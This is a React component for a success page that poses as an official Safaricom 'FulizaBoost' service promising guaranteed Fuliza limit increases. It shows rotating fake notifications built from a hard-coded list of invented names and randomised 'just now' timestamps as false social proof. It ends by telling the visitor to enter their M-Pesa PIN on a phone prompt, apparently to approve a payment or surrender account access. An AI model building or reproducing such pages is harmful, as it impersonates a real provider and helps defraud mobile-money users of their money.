import { useNavigate, useLocation } from "react-router-dom";
import "../styles/Success.css";
import { useEffect, useState } from "react";

const notifications = [
  { name: "Victor K.", limit: 45000 },
  { name: "James M.", limit: 30000 },
  { name: "Kevin O.", limit: 25000 },
  { name: "Dennis R.", limit: 35000 },
  { name: "Alex T.", limit: 20000 },
  { name: "Martin J.", limit: 15000 },
  { name: "Eric W.", limit: 40000 },
  { name: "Samuel P.", limit: 25000 },
  { name: "Victor L.", limit: 30000 },
  { name: "John K.", limit: 45000 },
];

// Weighted notification times
const notificationTimes = [
  { label: "just now", weight: 50 },
  { label: "3 mins ago", weight: 25 },
  { label: "5 mins ago", weight: 15 },
  { label: "6 mins ago", weight: 7 },
  { label: "10 mins ago", weight: 3 },
];

const getRandomTime = () => {
  const totalWeight = notificationTimes.reduce((sum, t) => sum + t.weight, 0);
  let rand = Math.random() * totalWeight;
  for (const t of notificationTimes) {
    if (rand < t.weight) return t.label;
    rand -= t.weight;
  }
  return "just now";
};

const Success = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const selectedLimit =
    location.state || JSON.parse(sessionStorage.getItem("selectedLimit") || "{}");

  const [currentNotification, setCurrentNotification] = useState({
    ...notifications[0],
    time: "just now",
  });
  const [showNotification, setShowNotification] = useState(true);

  // Rotate notifications every 4 seconds
  useEffect(() => {
    const interval = setInterval(() => {
      setShowNotification(false);

      setTimeout(() => {
        const randomIndex = Math.floor(Math.random() * notifications.length);
        setCurrentNotification({
          ...notifications[randomIndex],
          time: getRandomTime(),
        });
        setShowNotification(true);
      }, 300);
    }, 4000);

    return () => clearInterval(interval);
  }, []);

  return (
    <main className="success-container">
      {/* HEADER */}
      <div className="badge">● SAFARICOM OFFICIAL</div>

      <h1 className="success-title">FulizaBoost</h1>
      <p className="subtitle">Instant Limit Increase • Guaranteed Approval</p>

      {/* SUCCESS HEADING */}
      <h2 className="success-heading">Success!</h2>
      <p className="success-message">
        Your boost of{" "}
        <span className="amount-highlight">
          Ksh {selectedLimit.amount?.toLocaleString() || "30,000"}
        </span>{" "}
        has been successfully processed.
      </p>

      {/* NOTIFICATION INLINE */}
      <div className={`notification-overlay ${showNotification ? "show" : ""}`}>
        <div className="notification-icon"></div>
        <div className="notification-content">
          <strong>{currentNotification.name}</strong>{" "}
          <span className="notif-action">boosted</span>{" "}
          <span className="notif-amount">
            Ksh {currentNotification.limit.toLocaleString()}
          </span>
          <div className="notification-time">• {currentNotification.time}</div>
        </div>
      </div>

      {/* INSTRUCTION BOX */}
      <div className="instruction-box">
        <div className="warning-icon">⚠️</div>
        <div className="instruction-text">
          <strong>Final Step:</strong> Enter your M-Pesa PIN on the prompt currently
          showing on your phone to activate your new limit or dial *234*0# to check.
        </div>
      </div>

      {/* RETURN BUTTON */}
      <button className="return-btn" onClick={() => navigate("/")}>
        Return to Dashboard
      </button>
    </main>
  );
};

export default Success;